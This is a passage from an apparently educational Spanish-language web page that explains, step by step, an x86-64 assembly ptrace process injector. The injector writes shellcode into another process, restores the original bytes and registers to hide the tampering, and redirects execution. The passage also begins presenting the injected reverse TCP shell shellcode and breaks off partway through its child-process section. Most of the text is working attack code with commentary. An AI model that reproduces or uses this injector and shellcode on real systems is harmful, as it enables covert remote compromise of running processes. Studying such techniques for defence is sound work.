</span><span id="__span-7-9"><a id="__codelineno-7-9" name="__codelineno-7-9" href="#__codelineno-7-9"></a><span class="w">        </span><span class="nf">mov</span><span class="w"> </span><span class="nb">rsi</span><span class="p">,</span><span class="w"> </span><span class="nb">r15</span><span class="w">   </span><span class="c1">; PID</span>
</span><span id="__span-7-10"><a id="__codelineno-7-10" name="__codelineno-7-10" href="#__codelineno-7-10"></a><span class="w">        </span><span class="nf">mov</span><span class="w"> </span><span class="nb">rdx</span><span class="p">,</span><span class="w"> </span><span class="nb">r14</span><span class="w">   </span><span class="c1">; addr </span>
</span><span id="__span-7-11"><a id="__codelineno-7-11" name="__codelineno-7-11" href="#__codelineno-7-11"></a><span class="w">        </span><span class="nf">mov</span><span class="w"> </span><span class="nb">r10</span><span class="p">,</span><span class="w"> </span><span class="nb">r13</span><span class="w">   </span><span class="c1">; valor de 8 bytes a escribir</span>
</span><span id="__span-7-12"><a id="__codelineno-7-12" name="__codelineno-7-12" href="#__codelineno-7-12"></a><span class="w">        </span><span class="nf">syscall</span>
</span></code></pre></div>
<p>En el paso 3, sobreescribimos los bytes originales ubicados en la dirección apuntada por el registro <code>RIP</code>. Ahora que ya ejecutamos <code>mmap</code>, es momento de <strong>restaurar esos bytes originales para no dejar rastro de nuestra manipulación</strong>.</p>
<p>Se obtiene la dirección original del <code>RIP</code> desde <code>regs_ori+0x80</code> y se usa <code>PTRACE_POKEDATA</code> para escribir de vuelta el valor original. Tras esta operación, la memoria del <em>tracee</em> en ese punto vuelve a contener exactamente las mismas instrucciones que tenía antes de la intervención.</p>
<h3 id="restauracion-de-los-registros-originales">Restauración de los Registros Originales<a class="headerlink" href="#restauracion-de-los-registros-originales" title="Permanent link">&para;</a></h3>
<div class="language-nasm highlight"><pre><span></span><code><span id="__span-8-1"><a id="__codelineno-8-1" name="__codelineno-8-1" href="#__codelineno-8-1"></a><span class="c1">; 8 Restauración de los registros originales del proceso tracee</span>
</span><span id="__span-8-2"><a id="__codelineno-8-2" name="__codelineno-8-2" href="#__codelineno-8-2"></a><span class="w">        </span><span class="c1">; PTRACE_SETREGS</span>
</span><span id="__span-8-3"><a id="__codelineno-8-3" name="__codelineno-8-3" href="#__codelineno-8-3"></a><span class="w">        </span><span class="nf">mov</span><span class="w"> </span><span class="nb">rax</span><span class="p">,</span><span class="w"> </span><span class="mi">101</span>
</span><span id="__span-8-4"><a id="__codelineno-8-4" name="__codelineno-8-4" href="#__codelineno-8-4"></a><span class="w">        </span><span class="nf">mov</span><span class="w"> </span><span class="nb">rdi</span><span class="p">,</span><span class="w"> </span><span class="mi">13</span><span class="w">    </span><span class="c1">; PTRACE_SETREGS</span>
</span><span id="__span-8-5"><a id="__codelineno-8-5" name="__codelineno-8-5" href="#__codelineno-8-5"></a><span class="w">        </span><span class="nf">mov</span><span class="w"> </span><span class="nb">rsi</span><span class="p">,</span><span class="w"> </span><span class="nb">r15</span><span class="w">   </span><span class="c1">; PID</span>
</span><span id="__span-8-6"><a id="__codelineno-8-6" name="__codelineno-8-6" href="#__codelineno-8-6"></a><span class="w">        </span><span class="nf">xor</span><span class="w"> </span><span class="nb">rdx</span><span class="p">,</span><span class="w"> </span><span class="nb">rdx</span><span class="w">   </span><span class="c1">; addr</span>
</span><span id="__span-8-7"><a id="__codelineno-8-7" name="__codelineno-8-7" href="#__codelineno-8-7"></a><span class="w">        </span><span class="nf">lea</span><span class="w"> </span><span class="nb">r10</span><span class="p">,</span><span class="w"> </span><span class="p">[</span><span class="ow">rel</span><span class="w"> </span><span class="nv">regs_ori</span><span class="p">]</span><span class="w"> </span><span class="c1">; puntero al buffer donde se encuentra la estructura de registros</span>
</span><span id="__span-8-8"><a id="__codelineno-8-8" name="__codelineno-8-8" href="#__codelineno-8-8"></a><span class="w">        </span><span class="nf">syscall</span>
</span></code></pre></div>
<p>Con <code>PTRACE_SETREGS</code> se <strong>restauran todos los registros del <em>tracee</em> a su estado original</strong> usando el backup <code>regs_ori</code>. Esto devuelve al <em>tracee</em> a exactamente el mismo estado en el que se encontraba cuando lo detuvimos.</p>
<p>Esto es importante porque en los pasos posteriores vamos a modificar selectivamente solo el registro <code>RIP</code> (para redirigir la ejecución al shellcode) y el <code>orig_rax</code> (para evitar el reinicio de syscalls). </p>
<h3 id="almacenamiento-del-rip-de-retorno">Almacenamiento del <code>RIP</code> de Retorno<a class="headerlink" href="#almacenamiento-del-rip-de-retorno" title="Permanent link">&para;</a></h3>
<div class="language-nasm highlight"><pre><span></span><code><span id="__span-9-1"><a id="__codelineno-9-1" name="__codelineno-9-1" href="#__codelineno-9-1"></a><span class="c1">; 9 Almacenamiento del RIP de retorno en los últimos 8 bytes de la región de memoria reservada por MMAP</span>
</span><span id="__span-9-2"><a id="__codelineno-9-2" name="__codelineno-9-2" href="#__codelineno-9-2"></a>
</span><span id="__span-9-3"><a id="__codelineno-9-3" name="__codelineno-9-3" href="#__codelineno-9-3"></a><span class="w">        </span><span class="c1">; PTRACE_POKEDATA (escribir en memoria)</span>
</span><span id="__span-9-4"><a id="__codelineno-9-4" name="__codelineno-9-4" href="#__codelineno-9-4"></a><span class="w">        </span><span class="nf">mov</span><span class="w"> </span><span class="nb">rax</span><span class="p">,</span><span class="w"> </span><span class="mi">101</span>
</span><span id="__span-9-5"><a id="__codelineno-9-5" name="__codelineno-9-5" href="#__codelineno-9-5"></a><span class="w">        </span><span class="nf">mov</span><span class="w"> </span><span class="nb">rdi</span><span class="p">,</span><span class="w"> </span><span class="mi">5</span><span class="w">     </span><span class="c1">; PTRACE_POKEDATA</span>
</span><span id="__span-9-6"><a id="__codelineno-9-6" name="__codelineno-9-6" href="#__codelineno-9-6"></a><span class="w">        </span><span class="nf">mov</span><span class="w"> </span><span class="nb">rsi</span><span class="p">,</span><span class="w"> </span><span class="nb">r15</span><span class="w">   </span><span class="c1">; PID</span>
</span><span id="__span-9-7"><a id="__codelineno-9-7" name="__codelineno-9-7" href="#__codelineno-9-7"></a><span class="w">        </span><span class="nf">lea</span><span class="w"> </span><span class="nb">rdx</span><span class="p">,</span><span class="w"> </span><span class="p">[</span><span class="nb">r12</span><span class="o">+</span><span class="mi">4088</span><span class="p">]</span><span class="w">   </span><span class="c1">; addr </span>
</span><span id="__span-9-8"><a id="__codelineno-9-8" name="__codelineno-9-8" href="#__codelineno-9-8"></a><span class="w">        </span><span class="nf">mov</span><span class="w"> </span><span class="nb">r10</span><span class="p">,</span><span class="w"> </span><span class="nb">r14</span><span class="w">   </span><span class="c1">; valor de 8 bytes a escribir</span>
</span><span id="__span-9-9"><a id="__codelineno-9-9" name="__codelineno-9-9" href="#__codelineno-9-9"></a><span class="w">        </span><span class="nf">syscall</span>
</span></code></pre></div>
<p>Este paso es clave para que la inyección sea transparente<strong>,</strong> el proceso <em>tracee</em> debe poder retomar su ejecución después de que el shellcode haga su trabajo.</p>
<p>La región de memoria reservada por <code>mmap</code> tiene 4096 bytes (según lo asignado en los argumentos de entrada). <strong>El shellcode se escribirá desde el inicio de esta región, pero los últimos 8 bytes (<code>offset+4088</code>) se reservarán para almacenar la dirección de retorno (el valor original del registro  <code>RIP</code> del <em>tracee</em>).</strong></p>
<p>Cuando el shellcode se ejecute en el contexto del <em>tracee</em>, hará <code>fork</code> (crea un proceso hijo duplicando el proceso actual). El proceso hijo ejecutará la reverse shell, pero el proceso padre necesita saber a dónde volver. El padre leerá esta dirección desde <code>[_start + 4088]</code> (que equivale a <code>mmap_base + 4088</code>) y saltará a ella, retomando la ejecución exactamente donde se había detenido.</p>
<div class="language-nasm highlight"><pre><span></span><code><span id="__span-10-1"><a id="__codelineno-10-1" name="__codelineno-10-1" href="#__codelineno-10-1"></a><span class="nf">Región</span><span class="w"> </span><span class="nv">RWX</span><span class="w"> </span><span class="p">(</span><span class="mi">4096</span><span class="w"> </span><span class="kt">byte</span><span class="nv">s</span><span class="p">):</span>
</span><span id="__span-10-2"><a id="__codelineno-10-2" name="__codelineno-10-2" href="#__codelineno-10-2"></a><span class="err">┌──────────────────────────────────────────────────┬──────────┐</span>
</span><span id="__span-10-3"><a id="__codelineno-10-3" name="__codelineno-10-3" href="#__codelineno-10-3"></a><span class="err">│</span><span class="w">              </span><span class="nf">Shellcode</span><span class="w"> </span><span class="p">(</span><span class="kt">byte</span><span class="nv">s</span><span class="w"> </span><span class="mi">0</span><span class="nv">..4087</span><span class="p">)</span><span class="w">           </span><span class="err">│</span><span class="w"> </span><span class="nv">RIP</span><span class="w"> </span><span class="nv">ret</span><span class="w">  </span><span class="err">│</span>
</span><span id="__span-10-4"><a id="__codelineno-10-4" name="__codelineno-10-4" href="#__codelineno-10-4"></a><span class="err">│</span><span class="w">                                                  </span><span class="err">│</span><span class="w"> </span><span class="err">(8</span><span class="w"> </span><span class="nf">bytes</span><span class="p">)</span><span class="err">│</span>
</span><span id="__span-10-5"><a id="__codelineno-10-5" name="__codelineno-10-5" href="#__codelineno-10-5"></a><span class="err">│</span><span class="w">  </span><span class="nf">_start</span><span class="w"> </span><span class="err">→</span><span class="w"> </span><span class="nv">fork</span><span class="p">,</span><span class="w"> </span><span class="nv">setsid</span><span class="p">,</span><span class="w"> </span><span class="nv">socket</span><span class="p">,</span><span class="w"> </span><span class="nv">connect...</span><span class="w">       </span><span class="err">│</span><span class="w"> </span><span class="mi">4088</span><span class="o">-</span><span class="mi">4095</span><span class="err">│</span>
</span><span id="__span-10-6"><a id="__codelineno-10-6" name="__codelineno-10-6" href="#__codelineno-10-6"></a><span class="err">└──────────────────────────────────────────────────┴──────────┘</span>
</span><span id="__span-10-7"><a id="__codelineno-10-7" name="__codelineno-10-7" href="#__codelineno-10-7"></a><span class="w">                                                    </span><span class="err">▲</span>
</span><span id="__span-10-8"><a id="__codelineno-10-8" name="__codelineno-10-8" href="#__codelineno-10-8"></a><span class="w">                                                    </span><span class="err">│</span>
</span><span id="__span-10-9"><a id="__codelineno-10-9" name="__codelineno-10-9" href="#__codelineno-10-9"></a><span class="w">                                        </span><span class="nf">El</span><span class="w"> </span><span class="nv">padre</span><span class="w"> </span><span class="nv">lee</span><span class="w"> </span><span class="nv">esta</span>
</span><span id="__span-10-10"><a id="__codelineno-10-10" name="__codelineno-10-10" href="#__codelineno-10-10"></a><span class="w">                                        </span><span class="nf">dirección</span><span class="w"> </span><span class="nv">y</span><span class="w"> </span><span class="nv">salta</span>
</span></code></pre></div>
<h3 id="inyeccion-del-shellcode">Inyección del Shellcode<a class="headerlink" href="#inyeccion-del-shellcode" title="Permanent link">&para;</a></h3>
<div class="language-nasm highlight"><pre><span></span><code><span id="__span-11-1"><a id="__codelineno-11-1" name="__codelineno-11-1" href="#__codelineno-11-1"></a><span class="c1">; 10 Inyección del shellcode en la zona de memoria reservada (PTRACE_POKEDATA escribe 8 bytes)</span>
</span><span id="__span-11-2"><a id="__codelineno-11-2" name="__codelineno-11-2" href="#__codelineno-11-2"></a>
</span><span id="__span-11-3"><a id="__codelineno-11-3" name="__codelineno-11-3" href="#__codelineno-11-3"></a><span class="w">    </span><span class="nf">xor</span><span class="w"> </span><span class="nb">r13</span><span class="p">,</span><span class="nb">r13</span>
</span><span id="__span-11-4"><a id="__codelineno-11-4" name="__codelineno-11-4" href="#__codelineno-11-4"></a><span class="w">    </span><span class="nf">lea</span><span class="w"> </span><span class="nb">r13</span><span class="p">,</span><span class="w"> </span><span class="p">[</span><span class="ow">rel</span><span class="w"> </span><span class="nv">shellcode</span><span class="p">]</span><span class="w">   </span><span class="c1">; puntero al shellcode</span>
</span><span id="__span-11-5"><a id="__codelineno-11-5" name="__codelineno-11-5" href="#__codelineno-11-5"></a><span class="w">    </span><span class="nf">xor</span><span class="w"> </span><span class="nb">r14</span><span class="p">,</span><span class="w"> </span><span class="nb">r14</span>
</span><span id="__span-11-6"><a id="__codelineno-11-6" name="__codelineno-11-6" href="#__codelineno-11-6"></a><span class="w">    </span><span class="nf">mov</span><span class="w"> </span><span class="nb">r14</span><span class="p">,</span><span class="w"> </span><span class="nv">sc_len</span><span class="w"> </span><span class="o">/</span><span class="w"> </span><span class="mi">8</span><span class="w">        </span><span class="c1">; contador de palabras a escribir</span>
</span><span id="__span-11-7"><a id="__codelineno-11-7" name="__codelineno-11-7" href="#__codelineno-11-7"></a><span class="w">    </span><span class="nf">push</span><span class="w"> </span><span class="nb">r12</span>
</span><span id="__span-11-8"><a id="__codelineno-11-8" name="__codelineno-11-8" href="#__codelineno-11-8"></a>
</span><span id="__span-11-9"><a id="__codelineno-11-9" name="__codelineno-11-9" href="#__codelineno-11-9"></a><span class="w">    </span><span class="nl">.loop_inj:</span>
</span><span id="__span-11-10"><a id="__codelineno-11-10" name="__codelineno-11-10" href="#__codelineno-11-10"></a>
</span><span id="__span-11-11"><a id="__codelineno-11-11" name="__codelineno-11-11" href="#__codelineno-11-11"></a><span class="w">        </span><span class="nf">cmp</span><span class="w"> </span><span class="nb">r14</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="w">     </span><span class="c1">; compara el contador de palabras a escribir con 0</span>
</span><span id="__span-11-12"><a id="__codelineno-11-12" name="__codelineno-11-12" href="#__codelineno-11-12"></a><span class="w">        </span><span class="nf">jz</span><span class="w"> </span><span class="nv">.done</span><span class="w">       </span><span class="c1">; si contador == 0, saltar a .done</span>
</span><span id="__span-11-13"><a id="__codelineno-11-13" name="__codelineno-11-13" href="#__codelineno-11-13"></a>
</span><span id="__span-11-14"><a id="__codelineno-11-14" name="__codelineno-11-14" href="#__codelineno-11-14"></a><span class="w">        </span><span class="c1">; PTRACE_POKEDATA</span>
</span><span id="__span-11-15"><a id="__codelineno-11-15" name="__codelineno-11-15" href="#__codelineno-11-15"></a><span class="w">        </span><span class="nf">mov</span><span class="w"> </span><span class="nb">rax</span><span class="p">,</span><span class="w"> </span><span class="mi">101</span>
</span><span id="__span-11-16"><a id="__codelineno-11-16" name="__codelineno-11-16" href="#__codelineno-11-16"></a><span class="w">        </span><span class="nf">mov</span><span class="w"> </span><span class="nb">rdi</span><span class="p">,</span><span class="w"> </span><span class="mi">5</span><span class="w">     </span><span class="c1">; PTRACE_POKEDATA</span>
</span><span id="__span-11-17"><a id="__codelineno-11-17" name="__codelineno-11-17" href="#__codelineno-11-17"></a><span class="w">        </span><span class="nf">mov</span><span class="w"> </span><span class="nb">rsi</span><span class="p">,</span><span class="w"> </span><span class="nb">r15</span><span class="w">   </span><span class="c1">; PID</span>
</span><span id="__span-11-18"><a id="__codelineno-11-18" name="__codelineno-11-18" href="#__codelineno-11-18"></a><span class="w">        </span><span class="nf">mov</span><span class="w"> </span><span class="nb">rdx</span><span class="p">,</span><span class="w"> </span><span class="nb">r12</span><span class="w">   </span><span class="c1">; addr </span>
</span><span id="__span-11-19"><a id="__codelineno-11-19" name="__codelineno-11-19" href="#__codelineno-11-19"></a><span class="w">        </span><span class="nf">mov</span><span class="w"> </span><span class="nb">r10</span><span class="p">,</span><span class="w"> </span><span class="p">[</span><span class="nb">r13</span><span class="p">]</span><span class="w"> </span><span class="c1">; valor de 8 bytes a escribir</span>
</span><span id="__span-11-20"><a id="__codelineno-11-20" name="__codelineno-11-20" href="#__codelineno-11-20"></a><span class="w">        </span><span class="nf">syscall</span>
</span><span id="__span-11-21"><a id="__codelineno-11-21" name="__codelineno-11-21" href="#__codelineno-11-21"></a>
</span><span id="__span-11-22"><a id="__codelineno-11-22" name="__codelineno-11-22" href="#__codelineno-11-22"></a><span class="w">        </span><span class="nf">add</span><span class="w"> </span><span class="nb">r12</span><span class="p">,</span><span class="w"> </span><span class="mi">8</span>
</span><span id="__span-11-23"><a id="__codelineno-11-23" name="__codelineno-11-23" href="#__codelineno-11-23"></a><span class="w">        </span><span class="nf">add</span><span class="w"> </span><span class="nb">r13</span><span class="p">,</span><span class="w"> </span><span class="mi">8</span>
</span><span id="__span-11-24"><a id="__codelineno-11-24" name="__codelineno-11-24" href="#__codelineno-11-24"></a><span class="w">        </span><span class="nf">dec</span><span class="w"> </span><span class="nb">r14</span>
</span><span id="__span-11-25"><a id="__codelineno-11-25" name="__codelineno-11-25" href="#__codelineno-11-25"></a><span class="w">        </span><span class="nf">jmp</span><span class="w"> </span><span class="nv">.loop_inj</span>
</span></code></pre></div>
<p>Ahora <strong>se copia el shellcode completo en la región de memoria reservada</strong>. Dado que <code>PTRACE_POKEDATA</code> escribe <strong>exactamente 8 bytes por llamada</strong>, debemos iterar <code>sc_len / 8</code> veces (longitud del shellcode dividida entre 8).</p>
<p>En cada iteración:</p>
<ul>
<li><code>r13</code> apunta a la posición actual dentro del shellcode (en el espacio del tracer).</li>
<li><code>r12</code> apunta a la posición actual dentro de la región generada por <code>mmap</code> (en el espacio del <em>tracee</em>).</li>
<li>Se leen 8 bytes desde <code>[r13]</code> y se escriben en <code>[r12]</code> del <em>tracee</em>.</li>
<li>Ambos punteros avanzan 8 bytes y el contador <code>r14</code> se decrementa.</li>
</ul>
<blockquote>
<p>El shellcode está alineado a 8 bytes (se añaden bytes <code>0x90</code> (NOP) al final si es necesario) para que la última escritura de <code>PTRACE_POKEDATA</code> no se salga de los límites del shellcode.
</p>
</blockquote>
<h3 id="redirigir-ejecucion-al-inicio-del-shellcode-y-detach">Redirigir Ejecución al Inicio del Shellcode y Detach<a class="headerlink" href="#redirigir-ejecucion-al-inicio-del-shellcode-y-detach" title="Permanent link">&para;</a></h3>
<div class="language-nasm highlight"><pre><span></span><code><span id="__span-12-1"><a id="__codelineno-12-1" name="__codelineno-12-1" href="#__codelineno-12-1"></a><span class="c1">; 11 Redirigir ejecución al inicio del shellcode</span>
</span><span id="__span-12-2"><a id="__codelineno-12-2" name="__codelineno-12-2" href="#__codelineno-12-2"></a>
</span><span id="__span-12-3"><a id="__codelineno-12-3" name="__codelineno-12-3" href="#__codelineno-12-3"></a><span class="nf">.done</span>
</span><span id="__span-12-4"><a id="__codelineno-12-4" name="__codelineno-12-4" href="#__codelineno-12-4"></a>
</span><span id="__span-12-5"><a id="__codelineno-12-5" name="__codelineno-12-5" href="#__codelineno-12-5"></a><span class="w">        </span><span class="nf">pop</span><span class="w"> </span><span class="nb">r12</span>
</span><span id="__span-12-6"><a id="__codelineno-12-6" name="__codelineno-12-6" href="#__codelineno-12-6"></a>
</span><span id="__span-12-7"><a id="__codelineno-12-7" name="__codelineno-12-7" href="#__codelineno-12-7"></a><span class="w">        </span><span class="nf">mov</span><span class="w"> </span><span class="kt">qword</span><span class="w"> </span><span class="p">[</span><span class="nv">regs_ori</span><span class="o">+</span><span class="mh">0x80</span><span class="p">],</span><span class="w"> </span><span class="nb">r12</span><span class="w">   </span><span class="c1">; RIP == dirección del inicio de la memoria reservada == inicio del shellcode</span>
</span><span id="__span-12-8"><a id="__codelineno-12-8" name="__codelineno-12-8" href="#__codelineno-12-8"></a><span class="w">        </span><span class="nf">mov</span><span class="w"> </span><span class="kt">qword</span><span class="w"> </span><span class="p">[</span><span class="nv">regs_ori</span><span class="o">+</span><span class="mh">0x78</span><span class="p">],</span><span class="w"> </span><span class="o">-</span><span class="mi">1</span><span class="w">    </span><span class="c1">; orig_rax = -1 (evita syscall restart)</span>
</span><span id="__span-12-9"><a id="__codelineno-12-9" name="__codelineno-12-9" href="#__codelineno-12-9"></a>
</span><span id="__span-12-10"><a id="__codelineno-12-10" name="__codelineno-12-10" href="#__codelineno-12-10"></a><span class="w">        </span><span class="c1">; PTRACE_SETREGS</span>
</span><span id="__span-12-11"><a id="__codelineno-12-11" name="__codelineno-12-11" href="#__codelineno-12-11"></a><span class="w">        </span><span class="nf">mov</span><span class="w"> </span><span class="nb">rax</span><span class="p">,</span><span class="w"> </span><span class="mi">101</span>
</span><span id="__span-12-12"><a id="__codelineno-12-12" name="__codelineno-12-12" href="#__codelineno-12-12"></a><span class="w">        </span><span class="nf">mov</span><span class="w"> </span><span class="nb">rdi</span><span class="p">,</span><span class="w"> </span><span class="mi">13</span><span class="w">    </span><span class="c1">; PTRACE_SETREGS</span>
</span><span id="__span-12-13"><a id="__codelineno-12-13" name="__codelineno-12-13" href="#__codelineno-12-13"></a><span class="w">        </span><span class="nf">mov</span><span class="w"> </span><span class="nb">rsi</span><span class="p">,</span><span class="w"> </span><span class="nb">r15</span><span class="w">   </span><span class="c1">; PID</span>
</span><span id="__span-12-14"><a id="__codelineno-12-14" name="__codelineno-12-14" href="#__codelineno-12-14"></a><span class="w">        </span><span class="nf">xor</span><span class="w"> </span><span class="nb">rdx</span><span class="p">,</span><span class="w"> </span><span class="nb">rdx</span><span class="w">   </span><span class="c1">; addr</span>
</span><span id="__span-12-15"><a id="__codelineno-12-15" name="__codelineno-12-15" href="#__codelineno-12-15"></a><span class="w">        </span><span class="nf">lea</span><span class="w"> </span><span class="nb">r10</span><span class="p">,</span><span class="w"> </span><span class="p">[</span><span class="ow">rel</span><span class="w"> </span><span class="nv">regs_ori</span><span class="p">]</span><span class="w"> </span><span class="c1">; puntero al buffer donde se encuentra la estructura de registros</span>
</span><span id="__span-12-16"><a id="__codelineno-12-16" name="__codelineno-12-16" href="#__codelineno-12-16"></a><span class="w">        </span><span class="nf">syscall</span>
</span><span id="__span-12-17"><a id="__codelineno-12-17" name="__codelineno-12-17" href="#__codelineno-12-17"></a>
</span><span id="__span-12-18"><a id="__codelineno-12-18" name="__codelineno-12-18" href="#__codelineno-12-18"></a><span class="c1">; 12 Detach del tracee</span>
</span><span id="__span-12-19"><a id="__codelineno-12-19" name="__codelineno-12-19" href="#__codelineno-12-19"></a>
</span><span id="__span-12-20"><a id="__codelineno-12-20" name="__codelineno-12-20" href="#__codelineno-12-20"></a><span class="w">    </span><span class="c1">; PTRACE_DETACH</span>
</span><span id="__span-12-21"><a id="__codelineno-12-21" name="__codelineno-12-21" href="#__codelineno-12-21"></a><span class="w">    </span><span class="nf">mov</span><span class="w"> </span><span class="nb">rax</span><span class="p">,</span><span class="w"> </span><span class="mi">101</span>
</span><span id="__span-12-22"><a id="__codelineno-12-22" name="__codelineno-12-22" href="#__codelineno-12-22"></a><span class="w">    </span><span class="nf">mov</span><span class="w"> </span><span class="nb">rdi</span><span class="p">,</span><span class="w"> </span><span class="mi">17</span><span class="w">    </span><span class="c1">; PTRACE_DETACH</span>
</span><span id="__span-12-23"><a id="__codelineno-12-23" name="__codelineno-12-23" href="#__codelineno-12-23"></a><span class="w">    </span><span class="nf">mov</span><span class="w"> </span><span class="nb">rsi</span><span class="p">,</span><span class="w"> </span><span class="nb">r15</span><span class="w">   </span><span class="c1">; PID</span>
</span><span id="__span-12-24"><a id="__codelineno-12-24" name="__codelineno-12-24" href="#__codelineno-12-24"></a><span class="w">    </span><span class="nf">xor</span><span class="w"> </span><span class="nb">rdx</span><span class="p">,</span><span class="w"> </span><span class="nb">rdx</span><span class="w">   </span><span class="c1">; addr</span>
</span><span id="__span-12-25"><a id="__codelineno-12-25" name="__codelineno-12-25" href="#__codelineno-12-25"></a><span class="w">    </span><span class="nf">xor</span><span class="w"> </span><span class="nb">r10</span><span class="p">,</span><span class="w"> </span><span class="nb">r10</span><span class="w">   </span><span class="c1">; signal = 0 (no enviar señal)</span>
</span><span id="__span-12-26"><a id="__codelineno-12-26" name="__codelineno-12-26" href="#__codelineno-12-26"></a><span class="w">    </span><span class="nf">syscall</span>
</span><span id="__span-12-27"><a id="__codelineno-12-27" name="__codelineno-12-27" href="#__codelineno-12-27"></a>
</span><span id="__span-12-28"><a id="__codelineno-12-28" name="__codelineno-12-28" href="#__codelineno-12-28"></a><span class="w">    </span><span class="c1">; EXIT</span>
</span><span id="__span-12-29"><a id="__codelineno-12-29" name="__codelineno-12-29" href="#__codelineno-12-29"></a><span class="w">    </span><span class="nf">mov</span><span class="w"> </span><span class="nb">rax</span><span class="p">,</span><span class="w"> </span><span class="mi">60</span>
</span><span id="__span-12-30"><a id="__codelineno-12-30" name="__codelineno-12-30" href="#__codelineno-12-30"></a><span class="w">    </span><span class="nf">xor</span><span class="w"> </span><span class="nb">rdi</span><span class="p">,</span><span class="nb">rdi</span><span class="w"> </span>
</span><span id="__span-12-31"><a id="__codelineno-12-31" name="__codelineno-12-31" href="#__codelineno-12-31"></a><span class="w">    </span><span class="nf">syscall</span>
</span></code></pre></div>
<p>Con el shellcode ya en su lugar, se realizan las modificaciones finales antes de liberar al <em>tracee</em>.</p>
<p>Se modifica el campo <code>RIP</code> en la estructura de registros para que apunte al inicio de la región definida por <code>mmap</code>, que es donde comienza el shellcode previamente inyectado. Cuando el <em>tracee</em> reanude su ejecución, lo hará desde la primera instrucción del shellcode.</p>
<p>Se establece el valor de <code>orig_rax</code>, **<em><em>usado internamente por el kernel para el mecanismo de syscall restart. Si el </em>tracee</em> fue detenido durante una syscall interrumpida, el kernel podría intentar re-ejecutarla automáticamente al reanudar. Establecer <code>orig_rax = -1</code> le dice al kernel que no hay ninguna syscall pendiente de reinicio, evitando comportamientos inesperados.</p>
<p>Se aplican los registros modificados con <code>PTRACE_SETREGS</code>.</p>
<p>Se libera al <em>tracee</em> con <code>PTRACE_DETACH</code> (operación 17). Esto <strong>reanuda la ejecución del proceso, que ahora comenzará a ejecutar el shellcode inyectado</strong>.</p>
<h2 id="el-shellcode-reverse-tcp-shell">El shellcode: Reverse TCP shell<a class="headerlink" href="#el-shellcode-reverse-tcp-shell" title="Permanent link">&para;</a></h2>
<p>El shellcode inyectado (<code>proc_inj_rev_tcp.asm</code>) no es una reverse shell convencional. Está diseñado específicamente para el contexto de inyección en procesos, con dos características clave:</p>
<ul>
<li><strong><code>fork</code></strong>: Crea un proceso hijo que ejecuta la reverse shell, mientras el proceso padre retoma la ejecución normal del <em>tracee</em>.</li>
<li><strong><code>setsid</code></strong>: El proceso hijo crea una nueva sesión, desvinculándose del terminal y del grupo de procesos del padre.</li>
</ul>
<h3 id="flujo-del-proceso-padre">Flujo del Proceso Padre<a class="headerlink" href="#flujo-del-proceso-padre" title="Permanent link">&para;</a></h3>
<div class="language-nasm highlight"><pre><span></span><code><span id="__span-13-1"><a id="__codelineno-13-1" name="__codelineno-13-1" href="#__codelineno-13-1"></a><span class="c1">; FORK</span>
</span><span id="__span-13-2"><a id="__codelineno-13-2" name="__codelineno-13-2" href="#__codelineno-13-2"></a><span class="w">    </span><span class="nf">mov</span><span class="w"> </span><span class="nb">rax</span><span class="p">,</span><span class="w"> </span><span class="mi">57</span>
</span><span id="__span-13-3"><a id="__codelineno-13-3" name="__codelineno-13-3" href="#__codelineno-13-3"></a><span class="w">    </span><span class="nf">syscall</span>
</span><span id="__span-13-4"><a id="__codelineno-13-4" name="__codelineno-13-4" href="#__codelineno-13-4"></a>
</span><span id="__span-13-5"><a id="__codelineno-13-5" name="__codelineno-13-5" href="#__codelineno-13-5"></a><span class="w">    </span><span class="nf">cmp</span><span class="w"> </span><span class="nb">rax</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="w">           </span><span class="c1">; si rax==0 se trata del hijo</span>
</span><span id="__span-13-6"><a id="__codelineno-13-6" name="__codelineno-13-6" href="#__codelineno-13-6"></a><span class="w">    </span><span class="nf">jz</span><span class="w"> </span><span class="nv">.child</span><span class="w">            </span>
</span><span id="__span-13-7"><a id="__codelineno-13-7" name="__codelineno-13-7" href="#__codelineno-13-7"></a>
</span><span id="__span-13-8"><a id="__codelineno-13-8" name="__codelineno-13-8" href="#__codelineno-13-8"></a><span class="w">    </span><span class="nf">lea</span><span class="w"> </span><span class="nb">r11</span><span class="p">,</span><span class="w"> </span><span class="p">[</span><span class="ow">rel</span><span class="w"> </span><span class="nv">_start</span><span class="p">]</span><span class="w"> </span><span class="c1">; r11 = dirección de _start = mmap_base = RIP inicial del shellcode</span>
</span><span id="__span-13-9"><a id="__codelineno-13-9" name="__codelineno-13-9" href="#__codelineno-13-9"></a>
</span><span id="__span-13-10"><a id="__codelineno-13-10" name="__codelineno-13-10" href="#__codelineno-13-10"></a><span class="w">    </span><span class="c1">; Proceso Padre</span>
</span><span id="__span-13-11"><a id="__codelineno-13-11" name="__codelineno-13-11" href="#__codelineno-13-11"></a><span class="w">    </span><span class="nf">mov</span><span class="w"> </span><span class="nb">r14</span><span class="p">,</span><span class="w"> </span><span class="p">[</span><span class="nb">r11</span><span class="o">+</span><span class="mi">4088</span><span class="p">]</span><span class="w"> </span><span class="c1">; Obtiene dirección de retorno</span>
</span><span id="__span-13-12"><a id="__codelineno-13-12" name="__codelineno-13-12" href="#__codelineno-13-12"></a><span class="w">    </span><span class="nf">jmp</span><span class="w"> </span><span class="nb">r14</span><span class="w">             </span><span class="c1">; Salta a la dirección de retorno sobreescribiendo el registro RIP</span>
</span></code></pre></div>
<p>Tras el <code>fork</code>, <strong>el proceso padre necesita volver al punto exacto donde fue interrumpido</strong>. Para ello, obtiene la dirección base del shellcode en memoria (que coincide con el inicio de la región definida tras <code>mmap</code>). Sumando 4088 obtiene la posición donde el inyector almacenó la dirección de retorno original (paso 9). Finalmente, haciendo uso de la syscall <code>jmp</code> se salta a esa dirección, retomando su ejecución como si nada hubiera pasado.</p>
<p>Se utiliza <code>r11</code> intencionalmente porque es un ‘clobbered register’. Por tanto, al usar <code>r11</code> nos aseguramos de no modificar ningún registro funcional del proceso <em>tracee</em> que pudiera afectar a su ejecución futura.</p>
<h3 id="flujo-del-proceso-hijo">Flujo del proceso Hijo<a class="headerlink" href="#flujo-del-proceso-hijo" title="Permanent link">&para;</a></h3>
<div class="language-nasm highlight"><pre><span></span><code><span id="__span-14-1"><a id="__codelineno-14-1" name="__codelineno-14-1" href="#__codelineno-14-1"></a><span class="nf">.child</span>
</span><span id="__span-14-2"><a id="__codelineno-14-2" name="__codelineno-14-2" href="#__codelineno-14-2"></a>
